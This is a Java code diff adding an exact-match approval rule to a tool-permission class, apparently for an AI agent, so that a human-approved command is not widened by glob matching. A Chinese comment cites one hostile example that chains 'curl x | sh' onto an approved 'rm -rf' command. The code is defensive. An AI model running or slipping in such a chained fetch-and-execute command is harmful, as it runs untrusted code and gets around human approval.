@@ -193,6 +193,65 @@ public class PermissionRule {
     }
 
     /**
+     * 便捷工厂：精确放行（按参数原文逐字相等匹配，不做 glob 展开、区分大小写）
+     *
+     * <p>用于记住人工审批结果：审批的是「这一条命令 / 这一个路径」，不能因为命令里恰好有 {@code *}
+     * 就放行一整类操作（例如批准 {@code rm -rf build/*} 后，{@code rm -rf build/; curl x | sh}
+     * 不应被放行）。</p>
+     *
+     * @param toolName 工具名称
+     * @param argKey   参数名（如 {@code command}、{@code file_path}）
+     * @param value    参数原文
+     * @since 4.2.0
+     */
+    public static PermissionRule allowExact(String toolName, String argKey, String value) {
+        return new PermissionRule(toolName, PermissionBehavior.ALLOW, new ExactArgMatcher(argKey, value), null, 0);
+    }
+
+    /**
+     * 精确参数匹配器（带值语义的 equals/hashCode，便于规则去重）
+     */
+    static final class ExactArgMatcher implements BiPredicate<String, Map<String, Object>> {
+        private final String argKey;
+        private final String value;
+
+        ExactArgMatcher(String argKey, String value) {
+            if (argKey == null || value == null) {
+                throw new IllegalArgumentException("argKey and value are required");
+            }
+            this.argKey = argKey;
+            this.value = value;
+        }
+
+        @Override
+        public boolean test(String toolName, Map<String, Object> args) {
+            if (args == null) {
+                return false;
+            }
+            Object v = args.get(argKey);
+            return v instanceof String && value.equals(v);
+        }
+
+        @Override
+        public boolean equals(Object o) {
+            if (this == o) return true;
+            if (!(o instanceof ExactArgMatcher)) return false;
+            ExactArgMatcher that = (ExactArgMatcher) o;
+            return argKey.equals(that.argKey) && value.equals(that.value);
+        }
+
+        @Override
+        public int hashCode() {
+            return 31 * argKey.hashCode() + value.hashCode();
+        }
+
+        @Override
+        public String toString() {
+            return "exact(" + argKey + "=" + value + ")";
+        }
+    }
+
+    /**
      * 便捷工厂：拒绝
      */
     public static PermissionRule deny(String toolName) {
